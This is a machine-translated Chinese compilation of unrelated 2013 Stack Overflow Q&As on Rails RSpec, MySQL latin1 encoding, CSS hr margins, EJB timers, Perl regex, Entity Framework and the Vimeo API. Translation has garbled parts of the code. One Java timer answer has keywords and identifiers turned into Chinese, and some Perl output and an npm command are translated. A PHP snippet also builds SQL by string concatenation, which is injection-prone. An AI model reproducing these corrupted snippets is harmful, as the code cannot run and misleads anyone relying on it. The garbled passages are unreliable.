我在互联网上搜索了很多东西以及关于 Stackoverflow 的其他类似问题，但是我仍然不确定如何在我的 rails 应用程序中测试嵌套资源的创建方法。

资源路线

```
resources :projects, :except => [:index, :show] do
      resources :mastertags
end 
```

这是我要测试的操作：

```
 def create
    @mastertag =  @project.mastertags.build(params[:mastertag])

    respond_to do |format|
      if @mastertag.save
        format.html { redirect_to project_mastertags_path, notice: 'Mastertag was successfully created.' }
      else
        format.html { render action: "new" }
      end
    end
  end 
```

这是我相应的 Rspec 测试：

```
 context "with valid params" do
      it "creates a new Mastertag" do
        project = Project.create! valid_attributes[:project]
        mastertag = Mastertag.create! valid_attributes[:mastertag]
        expect {
          post :create, { project_id: project.id, :mastertag => valid_attributes[:mastertag] }
        }.to change(Mastertag, :count).by(1)
      end
  end 
```

我有一个 valid_attributes 函数：

```
 def valid_attributes
      { :project => FactoryGirl.attributes_for(:project_with_researcher), :mastertag => FactoryGirl.attributes_for(:mastertag) }
  end 
```

我收到以下错误：

```
Failure/Error: post :create, { project_id: project.id, :mastertag => valid_attributes[:mastertag] }
NoMethodError:
undefined method `reflect_on_association' for "5168164534b26179f30000a1":String 
```

我也尝试了几种变体，但似乎没有任何效果。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:42:34.200

答案会根据您的 FactoryGirl 版本略有变化。

第一个问题是，@projet 是在哪里创建的？我猜其他地方？

您正在创建项目和主标签，为什么要这样做？

```
project = Project.create! valid_attributes[:project]
mastertag = Mastertag.create! valid_attributes[:mastertag] 
```

这正是 FactoryGirl 在您致电时所做的`Factory(:project)`事情`Factory(:mastertag)`

下一个“wat”是您在规范中创建一个主标签。您不会在任何地方使用该变量。如果不解决您的问题，您的规范看起来会更好，如下所示：

```
it "creates a new Mastertag" do
  project = Factory(:project)
  expect {
    post :create, { project_id: project.id, :mastertag => Factory.attributes_for(:mastertag)}
  }.to change(Mastertag, :count).by(1)
end 
```

好的，现在我们已经完成了规范的清理，让我们看看你的错误。

好像在这一行

```
format.html { redirect_to project_mastertags_path, notice: 'Mastertag was successfully created.' } 
```

此路径需要一个项目 ID。

```
format.html { redirect_to project_mastertags_path(@project), notice: 'Mastertag was successfully created.' } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-15T16:36:01.523

@John Hinnegan 的回答是绝对正确的。我只想补充一点，在项目上使用 Id 很重要，而不仅仅是项目：

有时在参数中使用 project: 可能很明显，但这不起作用。

作品：

```
 expect {
      post :create, { project_id: project.id, :mastertag => valid_attributes[:mastertag] }
    }.to change(Mastertag, :count).by(1) 
```

不工作：

```
 expect {
      post :create, { project: project.id, :mastertag => valid_attributes[:mastertag] }
    }.to change(Mastertag, :count).by(1) 
```

# php - 错误的编码保存在 MySql 数据库中..Windows 7，Wamp 服务器

> ID：15973635
> 
> 赞同：1
> 
> 时间：2013-04-12T14:13:47.153
> 
> 标签：php, utf-8, character-encoding, wamp, latin1

我在 Windows 7 上使用 Wamp server 2.1 和 PHP 5.3.4、Apache 2.2.17、MySql 5.1.53。

httpd.conf：添加默认字符集“iso-8859-1”

php.ini: default_charset = "iso-8859-1"

我正在使用 php mysqli 类在具有 latin1 编码的表和具有 latin1 编码、latin1_swedish_ci 排序规则的列中插入数据。在 php 文件中，我通过元标记将 charset 设置为 ISO-8859-1，我渲染了一个带有 accept-charset="ISO-8859-1" 属性的表单。我使用 mysqli::set_charset 将数据库连接的字符集设置为 latin1，但输入的数据仍然损坏。据我了解，数据是有效的 latin1 字符。

编码：

```
$dbMain->set_charset('latin1');
$query = "INSERT INTO `table` (" . implode(',', array_keys($data)) . ") VALUES ('" . implode("','", array_values($data)) . "')";
$dbMain->query($query); 
```

数据被破坏：“字符 Ä、Ö、Ü、ä、ö、ü 和 ß。Shop-Produkte für die Elektronik”

当我通过 latin1 连接读取数据时，它给了我垃圾（带问号的黑色菱形）而不是我插入的数据。当我通过 utf8 连接读取数据时，它会显示正确的字符。在 SqlYog（MySql 客户端）中也是如此。如果我运行“SET NAMES latin1”并浏览表格，我会看到 barbage 字符。如果我运行“SET NAMES utf8”并浏览表格，我会看到正确的文本。这里有什么问题？

更新：

我在 MySql 客户端中运行了以下查询：

```
SET NAMES latin1;
SELECT my_column,HEX(my_column) FROM my_table; 
```

得到了这个结果

```
|my_column|HEX(my_column)|
--------------------------
|    ß    |     C39F     |    (entered manually from MySql client)
|   �    |       DF     |    (entered from php via latin1 connection) 
```

我的数据库没有cucu了吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:27:44.140

有几件事很重要：

*   您在从数据库读取/查看数据时使用什么编码？
*   你是如何从数据库中查看数据的？通过 mySQL 管理员或一些 php 脚本或 html 页面？
*   那么浏览器中设置了什么编码呢？
*   你用什么编码保存你的php文件？

你有没有想过编码转换？我想帮助你，因为我花了一些时间了解 latin2 和 utf8 编码（波兰语），但我需要你提供更多信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-29T07:20:16.660

出色地！保存的值完全没有问题。在这两种情况下，都是检索导致了问题。

对于 MySql 客户端，问题是当我使用 utf8 连接作为客户端的默认连接时，客户端仅显示存储的正确值。可能是客户端的 UI 仅适用于 utf8 编码。

在 HTML 响应的情况下，PHP 文件的编码是 ISO-8859-1，但 .html 模板文件以 UTF-8 编码保存。该网站使用常规解析器来解析模板，因此当它从 UTF-8 文件中获取内容并进行解析时，ISO-8859-1 数据被破坏。将 .html 文件的编码更改为 ISO-8859-1 解决了这个问题。

谢谢大家帮助我。我非常感谢。希望你不要生气

# c# - 图片资源内存不足

> ID：15973636
> 
> 赞同：1
> 
> 时间：2013-04-12T14:13:48.917
> 
> 标签：c#, image, memory, resources, resourcemanager

我们注意到 Visual Studio c# 中的图像资源有一个奇怪的行为。

如果您将图像添加到项目资源并多次加载图像，您很快就会遇到内存不足的异常。

它只发生在某些系统上（在我测试的每一台 PC 上）。

复制：

1.  创建 Windows 窗体项目
2.  将图像添加到项目资源 (32x32 PNG)
3.  创建一个包含 2000 个循环的 for 循环
4.  在循环中将图像从资源填充到私有列表

    ```
    private List<image> _images = new List<image>();
    private void ButtonClick(object sender, EventArgs e)
    {
        for (int i = 0; i < 2000; i++)
        {
            _images.Add(Properties.Resources.myImage);
        }
    } 
    ```

每次运行循环时都会分配一些内存。在健康的系统上，您可以这样做，直到达到 2GB（32 位应用程序）。

但是在一个生病的系统上。该应用程序已经挂起 200MB。

非常值得注意的是，sik 系统分配的内存与健康系统不同。sik 系统在单次执行循环时只分配大约一半的内存。sik 系统为每个循环分配 50MB。健康系统分配 120MB。

这些系统都完全相同。Core I7、Windows7、12GB RAM、Visual Studio 2012。在 Windows8 上，每个测试系统都会出现内存泄漏。

有没有人注意到同样的奇怪行为？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-16T06:00:08.627

我们发现了一些有趣的东西。

问题与 Internet Explorer 10 有关。这也解释了为什么泄漏出现在每个 Windows8

卸载 IE10 没有帮助。如果您卸载 Windows Update KB2670838，它会有所帮助。

顺便说一句……这段代码也有同样的问题。

```
Image.FromFile("myImage.png"); 
```

所以问题似乎出在 GDI+ 而不是 ResourceManager 中。

# javascript - javascript 编码格式是否继承自 html 文档的格式？

> ID：15973641
> 
> 赞同：0
> 
> 时间：2013-04-12T14:14:07.670
> 
> 标签：javascript, html, encoding

我正在为一个项目生成 Javascript 文件。代码使用 UTF8 保存在 JS 文本文件中。此代码可能包含包含重音字符的字符串。这些字符串可以分段显示，因此我使用`StringEscapeUtils`Apache Commons 对它们进行了 html 转义。

从[这里开始](https://stackoverflow.com/questions/7381974/which-characters-need-to-be-escaped-on-html)，我认为这种做法对于使用 UTF8 的 HTML 文档是安全且足够的，但是对于导入的 javascripts 呢？它们是否“继承”与引用 html 文档相同的格式？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:20:18.953

[字符集是隐含的，从HTML 4.01 规范](http://www.w3.org/TR/html4/interact/scripts.html#h-18.2.1)的这个 DTD 片段中可以看出：

```
<!ELEMENT SCRIPT - - %Script;          -- script statements -->
<!ATTLIST SCRIPT
  charset     %Charset;      #IMPLIED  -- char encoding of linked resource --
  type        %ContentType;  #REQUIRED -- content type of script language --
  src         %URI;          #IMPLIED  -- URI for an external script --
  defer       (defer)        #IMPLIED  -- UA may defer execution of script --
  > 
```

浏览器将使用的实际字符集将是在[字符集标题](http://www.w3.org/TR/html4/charset.html#spec-char-encoding)中传入的字符集（如果提供的话）并且元素本身没有`charset`属性。

如果要*确保*使用正确的字符集，请将其放在脚本元素声明中：

```
<script charset="UTF-8" ... ></script> 
```

# npm - 如何使用这个命令 npm install ws.js**

> ID：15973643
> 
> 赞同：0
> 
> 时间：2013-04-12T14:14:14.810
> 
> 标签：npm

我想从 javascript 向具有 ws 安全性的 Web 服务发出请求。

所以我知道我必须使用这个库

但首先写的是我应该使用安装库

**1\. 首先你必须安装 Ws.js 模块：复制代码**

**npm 安装 ws.js**

我一直在到处搜索在哪里使用这个命令以及如何以及从哪里下载我没有的 ws.js nut

任何帮助表示赞赏。

谢谢Q

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-22T12:41:15.327

如果你已经安装了 node.js，你可以打开**node.js 命令 promt**并使用命令**npm install ws.js 安装模块**

# html - 减少两个之间的白色间隙 标签

> ID：15973652
> 
> 赞同：7
> 
> 时间：2013-04-12T14:14:27.783
> 
> 标签：html

我有以下菜单![菜单](https://i.stack.imgur.com/O3O1x.jpg)

这两行都是“hr”标签，菜单是一个包含 ul 的 div。我已经在谷歌上搜索了一段时间，并尝试使用边距和填充来调整 css，但我想减少行和文本之间的空白，使它们更接近文本。

HTML：

```
<hr id="header_line"/>
<div id="menu_bar">
    <ul>
        <li><a href="#">Add new Form</a></li>
        <li><a href="#">View old forms</a></li>
        <li><a href="#">Reports</a></li>
        <li><a href="#">Site Administration</a></li>
    </ul>
</div>
<hr id="under_menu_line"/> 
```

CSS：

```
#menu_bar ul {
    list-style:none;
    padding-left:0px;
}

#menu_bar ul li {
    display:inline;
    padding-left:10px;
}

#menu_bar ul li a {
    text-decoration:none;
    color:Black;
    font-family:Century Gothic;
    font-size:12pt;
}

#menu_bar ul li a:hover {
    color:#007C5A;
}

#header_line {
    margin-top:5px;
}

#under_menu_line {
    margin-top:5px;
} 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-04-12T14:19:32.600

最好的解决方案是删除`<hr>`s，并在div 上使用`border-top`and 。`border-bottom``padding`

`<hr>`应作为水平尺使用。例如，段落的硬分离或长时间的休息。而不是作为视觉元素。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-04-12T14:32:50.500

就像任何其他元素一样，`<hr>`由 CSS 控制。您要控制的空间只是边距。这是 Firefox 的默认设置：

```
hr {
    -moz-box-sizing: border-box;
    -moz-float-edge: margin-box;
    border: 1px inset;
    color: gray;
    display: block;
    height: 2px;
    margin: 0.5em auto;
} 
```

因此，以下将使空间变为 0.1em 而不是 0.5em：

```
hr { margin: 0.1em auto; } 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-12T14:24:21.970

试试这个，告诉我这是否是你想要的。

```
#header_line { margin-top:5px; margin-bottom:-10px;} 
#under_menu_line { margin-top:-10px; } 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-06-06T13:33:03.290

利用

```
#header_line{
    margin-bottom:0px;
}

#under_menu_line{
    margin-top:0px;
} 
```

# ios - IDE 错误：变量未定义但在 if 语句中定义

> ID：15973659
> 
> 赞同：0
> 
> 时间：2013-04-12T14:14:43.707
> 
> 标签：ios, objective-c

我`NSURL *url`在一系列 else if 中定义变量，其中不可能有错误，所以它总是会被定义（我可以稍后添加错误捕获以防万一）。

这是一种可怕的做法，但我对这门语言相当陌生。

```
if (whatTime == @"1000") {
        NSURL *url = [NSURL URLWithString:@"http://yyy/json.php?f=1&time=1000"];
    }else if(whatTime == @"1100"){
        NSURL *url = [NSURL URLWithString:@"http://yyy/json.php?f=1"];
    }else if(whatTime == @"1100"){
        NSURL *url = [NSURL URLWithString:@"http://yyy/json.php?f=1"];
    } 
```

但是调试器告诉我 url 是未定义的。有没有办法解决这个问题？

当我这样做时（在 ifs 的地狱坑之上）`NSURL *url;`它运行但说它没有连接到互联网。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:16:41.133

对于未定义的问题，您必须`NSUrl *url`在 if/else 之外声明：

```
NSURL *url = nil;
if (whatTime == @"1000") {
    url = [NSURL URLWithString:@"http://yyy/json.php?f=1&time=1000"];
}else if(whatTime == @"1100"){
    url = [NSURL URLWithString:@"http://yyy/json.php?f=1"];
}else if(whatTime == @"1100"){
    url = [NSURL URLWithString:@"http://yyy/json.php?f=1"];
} 
```

我认为未连接的问题与该代码无关。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T14:17:27.317

`if`在and子句中声明的局部变量`else if`仅在这些范围内可见，因此您不能在 last 之后使用它们`else if`。通过在它`NSURL *url;`之前声明`if`它将在最后一个之后可见，`else if`因为它在同一范围内。

“未连接到互联网”错误可能与此代码无关。可能您的设备/模拟器没有连接。

# java - EJB 3.x 中 @Schedule 方法的动态参数

> ID：15973661
> 
> 赞同：8
> 
> 时间：2013-04-12T14:14:49.267
> 
> 标签：java, timer, ejb-3.0, schedule

我是 J2EE6 中 @Schedule 注释的新手

我想使用 EJB 3.x 和 Glassfish 3.1 运行作业。

javax.ejb.Schedule 对我们来说似乎是一个不错的选择，因此我们可以将自定义时间想象为：

```
@Singleton
public class CustomTimer {
    @EJB
    SettingsFacade settingsFacade;

    @Schedule(second="someSecondParameter", minute="someMinuteParameter",hour="someHourParameter", persistent=false)
    public void executeTimer(){
        //Code executing something against database using the settingsFacade
    }
} 
```

在这里，我们希望从数据库中获取参数，因此每个月都会更改它们。有什么干净的解决方案吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2016-11-21T20:17:00.710

```
@Singleton
@启动
公共类 ScheduleTimerService {

    @Resource private TimerService timerService;

    公共无效 setTimerService(TimerService timerService) {this.timerService = timerService; }

    @PostConstruct
    私人无效postConstruct（）{
        timerService.createCalendarTimer(createSchedule());
    }

    @暂停
    公共无效计时器超时（计时器计时器）{
           在此处添加您的代码，以便在达到调度时调用...
           在此示例中：每天 01h:30m ;-)
    }

    私人 ScheduleExpression createSchedule(){

        ScheduleExpression 表达式 = new ScheduleExpression();
        expression.dayOfWeek("Sun,Mon,Tue,Wed,Thu,Fri,Sat");    
        表达式.小时（“01”）；
        表达式.分钟（“30”）；

        返回表达式；
    }
}

```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-12T18:18:02.073

不，没有解决方案`@Schedule`，因为注释属性通常应该是编译时常量。

当需要更大的灵活性时，可以使用[编程计时器。](http://docs.oracle.com/cd/E19798-01/821-1841/giqlt/index.html)此外，还必须实施轮询数据库以更改配置以及删除现有计时器和创建新计时器。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-16T09:59:38.273

那么您需要创建两个调度程序一个调度程序将运行以更新数据库中的数据，基于您可以创建其他调度程序。

但是对于这个需要做一些程序化的东西。您还可以查看 EJB 计时器，在这种情况下对您有帮助。这也是基于注释的。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2014-06-11T15:03:31.433

有一种简单的方法可以做到这一点。我想要一个每天都称为流程的东西，但是工作本身应该在同一天随机完成。我设法通过在调用 EJB 计时器服务后添加一个简单的线程工作者来运行它。然后我会让它在那天随机休眠一段时间。

以下代码是每 1 分钟唤醒一次并等待线程完成的服务示例。

```
@Schedule(minute = "*/1", hour = "*", persistent = false)
public void runEveryMinute() throws InterruptedException {
    log.log(Level.INFO, "Scheduling for every minute .. now it's: " + new Date().toString());

    // Delay, in milliseconds before we interrupt adding a follower thread
    //we can therefore garantee that it runs every day
    long patience = 1000 * 5;

    threadMessage("Starting forever alone no more thread");
    long startTime = System.currentTimeMillis();
    Thread t = new Thread(new MessageLoop());
    t.start();

    threadMessage("Waiting for new thread to finish");
    // loop until MessageLoop thread exits
    while (t.isAlive()) {
        threadMessage("Still waiting...");
        // Wait maximum of 1 second for MessageLoop thread to finish.
        t.join(1000);
        if (((System.currentTimeMillis() - startTime) > patience)
                && t.isAlive()) {
            threadMessage("Tired of waiting! Adding new followers now!");
            t.interrupt();
            // Shouldn't be long now -- wait indefinitely
            t.join();
        }
    }
    threadMessage("Finally! You are not alone anymore!");

}

// Display a message, preceded by
// the name of the current thread
static void threadMessage(String message) {
    String threadName = Thread.currentThread().getName();
    System.out.format("%s: %s%n", threadName, message);
}

private static class MessageLoop implements Runnable {

    public void run() {
        String importantInfo[] = {
            "A kid will eat ivy too"
        };
        try {
            for (int i = 0;
                    i < importantInfo.length;
                    i++) {
                // Pause for 4 seconds
                int max = 10;
                int min = 2;
                int randomTimer = 0 + (int) (Math.random() * ((max - min) + 1));
                Thread.sleep(randomTimer * 1000);
                // Print a message
                threadMessage(importantInfo[i]);
            }
        } catch (InterruptedException e) {
            threadMessage("Patience is not a virtue! Thread stopping for now!");
        }
    }
} 
```

# regex - perl 中的正则表达式，用于获取 1\. 和 2 之间的文本

> ID：15973669
> 
> 赞同：0
> 
> 时间：2013-04-12T14:15:11.923
> 
> 标签：regex, perl

```
1) some text 2)
1\. some text 2.
1) some text 2.

1\. 2.10.10.20 some text 2.
1) 2.10.10.20 2) 
```

我想获取 1) 和 2) 或 1\. 或 2\. 之间的文本，

这是我写的

```
1[).](.*?)2[).] 
```

所以这里 perl $1 会给我介于之间的文本，但这会在第三场比赛中失败（`1\. 2.10.10.20 some text 2.`）

所以有人可以帮我设置正则表达式。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:26:44.053

```
#!/usr/bin/env perl

use 5.012;
use strict;
use warnings;

while (my $line = <DATA>) {
    if ($line =~ m{ 1[.)] \s (.+?) \s 2[.)] }x) {
        say qq{'$1'};
    }
}

__DATA__
1) some text 2)
1\. some text 2.
1) some text 2.

1\. 2.10.10.20 some text 2.
1) 2.10.10.20 2) 
```

输出：

```
'一些文字'
'一些文字'
'一些文字'
'2.10.10.20 一些文字'
'2.10.10.20'
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:25:39.740

让你的正则表达式变得贪婪：

```
m/1[).](.*)2[).]/ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-12T17:37:52.977

我会写这样的东西：

```
 $line=~/^1[).]\s?([^\s].*[^\s])\s?2[).]$/ 
```

# silverlight - ms silverlight blend sketchflow - 组合框中的默认文本

> ID：15973670
> 
> 赞同：1
> 
> 时间：2013-04-12T14:15:13.333
> 
> 标签：silverlight, combobox, blend, sketchflow

我想在组合框中获取默认文本以显示“选择团队......”

像这样在 WPF

[设置组合框的默认文本](https://stackoverflow.com/questions/6601421/setting-default-text-for-a-combo-box)

但是在草图流中。

我怎样才能做到这一点？

谢谢

这是一个银光项目。我的 xaml 内容如下：

```
<UserControl
xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
mc:Ignorable="d"
x:Class="SchoolsLoginScreens.Screen_2"
Width="640" Height="480">

<Grid x:Name="LayoutRoot" Background="White">
<ComboBox Height="61.256" Width="136.569" IsEditable="True" IsReadOnly="True" Text="-- Select Team --"/>
</Grid> 
```

它说 IsEditable 没有设置器。但这似乎在 WPF 项目中像上面的例子一样工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-13T02:54:33.873

SketchFlow 项目是 WPF 或 SL 项目（取决于您在创建项目时选择的项目），因此您为 WPF/SL 找到的任何答案都应该适用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-05-13T21:46:31.473

我有同样的问题，发现[这](https://social.msdn.microsoft.com/Forums/expression/en-US/1218ea61-350a-4c93-9e07-cda1a2f42bb8/combo-box-questions?forum=blend)对我有帮助。本质上，您只需将至少一项添加到组合框（右键单击，添加 ComboBoxItem），然后在选择控件时查看 Common 属性，您将看到一个名为“SelectIndex”的字段，该字段当前设置为 - 1\. 只需将其更改为 0 即可选择列表中的第一项。

# entity-framework - EF 不会删除 Fluent API 的记录 - 多对多关系

> ID：15973672
> 
> 赞同：1
> 
> 时间：2013-04-12T14:15:17.427
> 
> 标签：entity-framework, ef-code-first, code-first, fluent-interface, entity-framework-migrations

我有2个实体，

*   消息
*   文件附件

我想使用代码优先的 fluent API 进行配置，以便每个新闻可以有 0,1 个或多个附件。

这是我现在正在使用的

```
 public NewsMap()
    {
        this.ToTable("News"); // Table Name
        this.HasKey(m => m.Id); // Primary Key

        // Field Definition            
        this.Property(m => m.Title).HasMaxLength(255).IsRequired();
        this.Property(m => m.Body).HasColumnType("Text").IsRequired();
        this.Property(m => m.Summary).HasMaxLength(1000).IsRequired();
        this.Property(m => m.AuthorId).IsRequired();

        this.Property(m => m.CreatedOn).IsRequired();
        this.Property(m => m.UpdatedOn).IsRequired();

        this.HasMany(m => m.Attachments).WithMany().Map(m => m.MapLeftKey("NewsId").MapRightKey("AttachmentId"));
    }

public class FileAttachmentMap : EntityTypeConfiguration<FileAttachment>
{
    public FileAttachmentMap()
    {
        this.ToTable("FileAttachments"); // Table Name
        this.HasKey(m => m.Id); // Primary Key

        // Field Definition            
        this.Property(m => m.DisplayName).HasMaxLength(256).IsRequired();
        this.Property(m => m.PhysicalFileName).HasMaxLength(256).IsRequired();
        this.Property(m => m.Extension).HasMaxLength(50).IsRequired();
        this.Property(m => m.IsImage).IsRequired();
        this.Property(m => m.ThumbTiny).HasMaxLength(275).IsOptional();
        this.Property(m => m.ThumbSmall).HasMaxLength(275).IsOptional();
        this.Property(m => m.ThumbMid).HasMaxLength(275).IsOptional();
        this.Property(m => m.ByteSize).IsRequired();
        this.Property(m => m.StorageType).IsRequired();   

        this.Property(m => m.CreatedOn).IsRequired();
        this.Property(m => m.UpdatedOn).IsRequired();
    }
} 
```

此映射正确生成一个名为 NewsFileAttachment 的中间表，其中包含两个字段：

*   新闻ID
*   附件 ID

当我调用 News.Attachments.Add(Attachment); 时在新闻实体上 它正确地在 Attachment 和 NewsAttachment 表中添加记录。

当我从 News.Attachments 中删除某些列表项时，它会正确地从 NewsAttachment 表中删除记录，但不会删除 FileAttachment 表中的记录。我也想删除它。

有人可以建议一个更好的 Fluent API 配置来实现这一点吗？

谢谢，阿米特

**编辑**

在我的情况下，FileAttachment 存储用于各种目的的文件。我的博客实体也有附件。因此，有两个中间表 BlogAttachments 和 FileAttachments。现在，如果我使用 WithOptional 作为（我不能使用 WithRequired，因为我在 FileAttachment 表中都需要 BlogId 和 NewsId），我可以摆脱中间表，但仍然删除不会从 FileAttachment 表中删除记录，它只是让 NewsId/博客 ID 为空。

有什么建议吗？主要是我不想用我在 FileAttachment 表中的所有字段创建单独的表。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:41:33.527

这是意料之中的——因为它创建了多对多和额外的表——级联仅适用于该表。

> `News`您的and 之间没有直接的“FK”关系`Attachment`，因为它通过连接表。因此，如果新闻确实删除了例如附件，则您不能期望删除 - 因为附件可能有其他与之相关的新闻。

另请参阅这个 - 它有点相关。
[使用 EF 代码优先与连接表建立一对多关系](https://stackoverflow.com/questions/15824135/one-to-many-relationship-with-join-table-using-ef-code-first)

即，如果您的结构允许不明确创建多对多（不要在两侧放置集合，或者在流利的配置中类似）。

在您的情况下**，提供您的“附件”在两者之间不可重用`News`**- 然后只需将集合导航属性放入`News`- 并留下附件没有任何 - 或从附件制作“FK”，单实例导航（如“父” ) 如果你需要的话。

> 另一方面，如果 an`attach...`可以由不同的 `news`记录作为父级 - 那么您无论如何都不应该级联删除。

**注意：** 检查您生成的迁移脚本 - 或 SQL/Db - 以查看它创建的确切内容 - 并确保没有创建中间表 - 并且只有一个“FK”从“附件”到“新闻”。

**编辑：**

```
modelBuilder.Entity<News>()
    .HasMany(c => c.Attachments)
    .WithOptional() // or WithRequired (test to see which is better for you)
    .WillCascadeOnDelete(true); 
```

...并`public ICollection<FileAttachment> Attachments {get;set;}`在新闻中制作一个。
（实际上集合属性就是你所需要的——但配置是为了安全你得到你想要的）

这将使您成为一对多（或多对一），这是您的数据的性质（正如您在评论中所说） - 您可以进行级联删除。

# c# - LINQ 中的 if else 条件

> ID：15973678
> 
> 赞同：0
> 
> 时间：2013-04-12T14:15:43.593
> 
> 标签：c#, linq, linq-to-sql

我正在学习 linq to sql。

是否可以在 linq to sql 中编写以下条件？

条件一

```
var query1 = 
             if
             from q in db.Students
             q.fees =="paid" && q.activites == "good" && count == 0
             select q 

              save "OK" to the property result. 

          else 
             from q in db.Students
             q.fees =="paid" && q.activites == "good" && count == 2
             select q 
             save "better" to the property result. 

            else
            from q in db.Students
            q.fees =="paid" && q.activites == "good" && count > 2
            select q 
            save "bad" to the property result. 

  private string _result; 
  public string Result
    {
        get { return this._result; ; }
        set { this._result;  = value; }
    } 
```

请指导。

更新编辑：

```
 var query1 =                  
             (from q in db.Students
             q.fees =="paid" && q.activites == "good" 
             select q).Any(); 

  if(count ==0 && query1 == true)
  {
    this.Result = "OK"
  }
  esle if(count == 2  && query1 == true)
  {
    this.Result = "better"
  }
  esle 
  {
    this.Result = "bad"
  } 
```

这将是一种方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T15:03:27.717

由于这都是代码方面的，因此您可以在运行 LINQ 查询后使用常规的 if-else 模式。

例子：

```
var query1 =                  
         from q in db.Students
         q.fees =="paid" && q.activites == "good" 
         select q;

if(count ==0 && query1.Count() > 0)
{
    this.Result = "OK";
}
else if(count == 2  && query1.Count() > 0)
{
    this.Result = "better";
}
else 
{
    this.Result = "bad";
} 
```

但是，由于 LINQ 只是用于确定记录是否存在，我建议使用该[`.Any()`](http://msdn.microsoft.com/en-us/library/bb337697.aspx?cs-save-lang=1&cs-lang=csharp#code-snippet-1)方法。

```
var recordsFound = db.Students.Any(q => q.fees =="paid" && q.activites == "good");

if(count == 0 && recordsFound)
{
    this.Result = "OK";
}
else if(count == 2 && recordsFound)
{
    this.Result = "better";
}
else 
{
    this.Result = "bad";
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:59:45.100

看起来您总是在相同的条件下进行查询，而您唯一有条件地做出反应的是返回的结果数量。您可以使用 where 条件获取结果，然后在结果计数周围放置一个 if 语句。

```
var count = (from q in db.Students
where q.fees == "paid" && q.activities == "good"
select q).Count();

if(count == 0){
     //do something
 }
 else if(count == 2){
     //do something 
 }
 ///etc... 
```

# xtext - 将代码注入生成的 xText 类

> ID：15973689
> 
> 赞同：1
> 
> 时间：2013-04-12T14:16:10.493
> 
> 标签：xtext

xText 中称为“组件”的规则通常会在 src-gen 文件夹中生成一个类“组件”。我想在这些类中添加额外的方法，而不会在每次对 DSL 进行微小更改时都被覆盖。将我自己的代码注入这些类的正确方法是什么？有没有办法让所有类扩展我自己的根类而不是默认的 EObject？

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T21:01:19.367

你基本上有两个选择：

*   您可以使用 a`IXtext2EcorePostProcessor`来修改 Xtext 从您的语法中推断出的 EMF 模型。实际的代码生成是由 EMF 完成的，所以你必须通过这个瓶颈来调整你的代码。[详细信息在Christian Dietrich 的博客中](http://christiandietrich.wordpress.com/2011/07/22/customizing-xtext-metamodel-inference-using-xtend2/)有所描述。这种方法只适用于小的修改。

*   您可以使用“代沟模式”（又名“实现差距模式”），它允许您编写从生成的模型类派生的类。在这里你可以添加任何你想要的东西。[Heiko Behrens 的博客](http://heikobehrens.net/2009/04/23/generation-gap-pattern/)中描述了详细信息。这种方法更适合通过继承进行大规模修改。

您当然可以混合使用这两种方法...

# javascript - 如何使用 Vimeo API 获取视频播放暂停状态？

> ID：15973698
> 
> 赞同：0
> 
> 时间：2013-04-12T14:16:24.293
> 
> 标签：javascript, api, vimeo, vimeo-player

[我只是想知道如何在 Vimeo API ( http://player.vimeo.com/playground](http://player.vimeo.com/playground) )上检测视频是否正在播放或暂停（甚至加载/缓冲），这与 Youtube 有很大不同！

乔

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-11-09T12:49:01.493

查看[使用 vimeo Player Javascript API 的最丰富示例](http://player.vimeo.com/playground)。它使用 froogaloop 库来通信 vimeo JS API。不要忘记将 id 和参数添加到 iframe 元素。

```
 <iframe id="player_1" src="http://player.vimeo.com/video/7100569?api=1&amp;player_id=player_1" width="540" height="304" frameborder="0" webkitallowfullscreen></iframe> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-12T14:23:35.947

Vimeo Player JavaScript API 提供以下方法：

`paused():Boolean`

如果视频正在播放，则此返回返回 false，否则返回 true。

完整的细节在这里：http: [//developer.vimeo.com/player/js-api](http://developer.vimeo.com/player/js-api)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-11-30T19:09:38.503

看起来他们的文档自上次回答以来略有变化。获得播放器实例后，您可以通过以下方式检查播放/暂停状态：

```
player.getPaused().then(function(paused) {
    if(paused){
        player.play();
    }else{
       player.pause();
    }

}); 
```

来自 vimeo [player api docs](https://github.com/vimeo/player.js#getpaused-promiseboolean-error)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-02-17T15:35:38.057

事实证明，您必须将回调作为第二个参数传递给`.api()`，它将接收`true`/`false`基于播放器的暂停状态：

```
player.api('paused', function(paused) {
    // paused will be true or false here
}); 
```

[https://github.com/vimeo/player-api/issues/31](https://github.com/vimeo/player-api/issues/31)

* * *

## 回答 #5

> 赞同：0
> 
